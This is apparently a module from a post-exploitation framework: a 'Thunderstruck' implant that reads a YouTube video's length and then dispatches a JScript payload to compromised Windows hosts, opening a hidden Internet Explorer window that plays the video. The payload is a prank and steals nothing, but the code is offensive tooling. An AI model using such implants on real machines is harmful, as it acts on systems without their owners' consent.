import core.job
import core.implant
import uuid

class ThunderstruckJob(core.job.Job):
    def done(self):
        self.display()

    def display(self):
        self.results = "Completed"
        self.shell.print_plain(self.data)

class ThunderstruckImplant(core.implant.Implant):

    NAME = "Thunderstruck"
    DESCRIPTION = "Opens hidden IE to the Thunderstruck YouTube video"
    AUTHORS = ["zerosum0x0"]
    STATE = "implant/fun/thunderstruck"

    def load(self):
        self.options.register("VIDEOURL", "https://www.youtube.com/watch?v=v2AC41dglnM", "YouTube video to play")
        self.options.register("SECONDS", "", "video length", hidden=True)

    def run(self):

        import urllib.request
        self.shell.print_status("Retrieving video length...")
        response = urllib.request.urlopen(self.options.get("VIDEOURL")).read().decode()
        ms = response.split('approxDurationMs\\":\\"')[1].split("\\")[0]
        seconds = int(ms)//1000
        self.shell.print_status(f"Video length: {seconds} seconds")

        self.options.set("SECONDS", str(seconds+1))

        payloads = {}
        #payloads["vbs"] = self.loader.load_script("data/implant/fun/thunderstruck.vbs", self.options)
        payloads["js"] = self.loader.load_script("data/implant/fun/thunderstruck.js", self.options)

        self.dispatch(payloads, ThunderstruckJob)
